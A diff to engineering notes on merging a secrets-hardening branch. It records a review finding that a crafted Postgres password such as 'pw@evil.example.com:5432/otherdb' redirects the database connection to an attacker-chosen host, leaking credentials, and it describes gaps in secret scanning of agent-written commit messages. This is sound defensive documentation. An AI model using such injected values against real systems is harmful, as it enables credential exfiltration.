@@ -296,6 +296,17 @@ of them.
 **Known merge conflict:** both branches modify `Makefile` (secrets adds the scan step; M0.3's earlier
 work touched targets) and `ops/BACKLOG.md`. Small and textual, but expect to resolve them by hand.
 
+> **CORRECTION, 2026-08-10, later the same day.** The compose item below was first recorded here as a
+> *deferrable* post-merge task. That was wrong, and the correction matters more than the original
+> entry. An independent review demonstrated it against the real template: with
+> `POSTGRES_PASSWORD=pw@evil.example.com:5432/otherdb`, the interpolated DSN parses to
+> `host='evil.example.com'` — **the container sends its username and a prefix of its password to an
+> off-box host of the password's choosing.** `pw/slash` yields `host='trading'`; `pw%40enc`
+> authenticates with a silently different password. That is not a misparse to tidy up later, it is a
+> credential-exfiltration path that arms itself the moment a real password is set. It is now a
+> **BLOCKING, must-fix-before-merge** item, tracked as a Wave-A integration task rather than a
+> follow-up, and no branch should be merged until it is closed and verified.
+
 **Post-merge integration task — do NOT skip it.** The secrets branch replaced the single interpolated
 DSN with discrete `postgres_host/port/user/password/db` settings passed as psycopg keyword arguments,
 so no character is ever URI grammar. That closes a **silent misparse** on the host path: a password
@@ -311,11 +322,23 @@ verification. It is a genuine two-branch dependency, deferred deliberately rathe
 Until it lands, **a container password containing `/`, `%`, `@` or a space is still unsafe** even
 though the host-side path is fixed.
 
-**Also unenforced until the secrets branch's B1 fix lands:** nothing scans for secrets on the path
-agents actually commit through. `orch set-state DONE` runs format/lint/types only and never calls
-`make check`; `.pre-commit-config.yaml` is not installed (no `.git/hooks/pre-commit` exists anywhere);
-and `make check` reaches the scan only on a tree that already passes formatting. The one control that
-works today fires **after** push — which on a deliberately-public repo (D5) is after the harm.
+**Enforcement, now closed on the secrets branch — but with one gap that remains open.** The B1 finding
+was that all three pre-publication controls were inert: `orch set-state DONE` ran format/lint/types and
+never called `make check`; `.pre-commit-config.yaml` was never installed (no `.git/hooks/pre-commit`
+existed anywhere); and `make check` reached the scan only on a tree that already passed formatting. The
+secrets branch fixes all three — the scan is now the **first** step of `make check` and the first,
+unconditional entry in `orch`'s check list, and the `# pragma: allowlist secret` bypass is disabled in
+every invocation. Verified by planting a pragma-carrying token inside a deliberately malformatted file:
+it still died at the scan, never reaching `ruff format`.
+
+**Still open, and stated accurately here because an earlier report of it was wrong:** nothing scans
+**commit messages**, anywhere. `orch` itself does not create commits — but **the agent does**
+(`git commit` is allow-listed and `orchestrator/prompts.py:100` instructs it), and `orch`'s scan runs
+*after* that commit already exists. Since repo policy forbids rewriting history, a secret in a commit
+message is caught only once it is permanently unrewritable. A `commit-msg` hook now exists but is
+local and opt-in (`make hooks`), so it does nothing for the autonomous path. Invariant #13 names commit
+messages explicitly, so this gap is real. All 6 of the secrets branch's own commit messages were
+manually scanned and are clean.
 
 ---
 
